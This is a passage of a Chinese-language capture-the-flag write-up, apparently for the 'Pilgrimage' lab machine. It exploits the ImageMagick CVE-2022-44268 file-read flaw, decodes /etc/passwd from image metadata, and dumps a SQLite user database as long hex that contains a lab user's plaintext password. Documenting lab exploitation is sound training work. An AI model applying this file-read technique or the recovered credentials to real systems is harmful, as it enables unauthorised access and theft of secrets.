+7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
+7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
+696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
+62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
+5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
+6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
+3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
+2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
+656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
+6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
+6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
+0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
+65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
+6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
+74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
+796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
+7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
+6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
+652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
+3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
+7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
+737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
+3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
+
+    signature: d02a8da86fec6ef80c209c8437c76cf8fbecb6528cd7ba95ef93eecc52a171c7
+  Artifacts:
+    filename: out.png
+    verbose: true
+  Tainted: False
+  Filesize: 1080B
+  Number pixels: 10000
+  Pixels per second: 7.09341MB
+  User time: 0.010u
+  Elapsed time: 0:01.001
+  Version: ImageMagick 6.9.11-60 Q16 x86_64 2021-01-25 https://imagemagick.org
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687703022871-7c9b3485-cad9-4397-8ea1-c32de307bc6d.png#averageHue=%232b2713&clientId=uf273fc15-75b9-4&from=paste&height=596&id=u8bdfccbd&originHeight=745&originWidth=1900&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=179498&status=done&style=none&taskId=uda42b6b6-05f5-4620-9912-5117f9f63df&title=&width=1520" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>对中间这一串使用hex解码<br>得到&#x2F;etc&#x2F;passwd的内容 ,我们可以使用<strong>print</strong> 命令来快速进行格式化</p>
+<pre><code class="bash">┌──(root💀kali)-[/home/…/machine/Pilgrimage/CVE-2022-44628/CVE-2022-44268]
+└─# print &quot;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n&quot;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
+</code></pre>
+<p>带sh的用户</p>
+<pre><code class="bash">root:x:0:0:root:/root:/bin/bash
+emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687703364663-e6230415-bbf5-4596-88c0-96bc212fde87.png#averageHue=%231b384c&clientId=uf273fc15-75b9-4&from=paste&height=140&id=u65bba558&originHeight=175&originWidth=679&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39449&status=done&style=none&taskId=uc341ccb9-d6dc-4902-8209-8f9d8445732&title=&width=543.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>这里有一个数据库文件，我们尝试读取这个</p>
+<h3 id="x2F-var-x2F-db-x2F-pilgrimage"><a href="#x2F-var-x2F-db-x2F-pilgrimage" class="headerlink" title="&#x2F;var&#x2F;db&#x2F;pilgrimage"></a>&#x2F;var&#x2F;db&#x2F;pilgrimage</h3><p>读取到后这其实是一个db文件，我们需要把他还原回来,并且写入</p>
+<pre><code class="bash">s=b&quot;53514c69746520666f726d617420330010000101004020200000011a0000000a0000000000000000000000040000000400000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000011a002e4b910d0ff800040eba000f650fcd0eba0f380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007c03071719190181537461626c65696d61676573696d6167657304435245415445205441424c4520696d61676573202875726c2054455854205052494d415259204b4559204e4f54204e554c4c2c206f726967696e616c2054455854204e4f54204e554c4c2c20757365726e616d652054455854204e4f54204e554c4c292b0406173f190100696e64657873716c6974655f6175746f696e6465785f696d616765735f31696d616765730566010717171701812b7461626c657573657273757365727302435245415445205441424c452075736572732028757365726e616d652054455854205052494d415259204b4559204e4f54204e554c4c2c2070617373776f72642054455854204e4f54204e554c4c29290206173d170100696e64657873716c6974655f6175746f696e6465785f75736572735f3175736572730300000008000000000d000000080f93000fe60fd10fc80fb90fae0fa70f9a0f930000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000508030f0f62620b0703151573617870313233340506030f0f616109050313137465737465730d0403171761646d696e61646d696e0703031111757575751302031d1d74657374323932397465737432393239180103172d656d696c796162696763686f6e6b79626f693132330a000000080fbc000fcb0fd90fbc0ff70fc20fd10fea0fe3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005030f01620808031501736178700705030f01610607031301746573050903170161646d696e04060311017575030c031d0174657374323932390208031709656d696c7905000000020ff6000000000a0ffb0ff600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000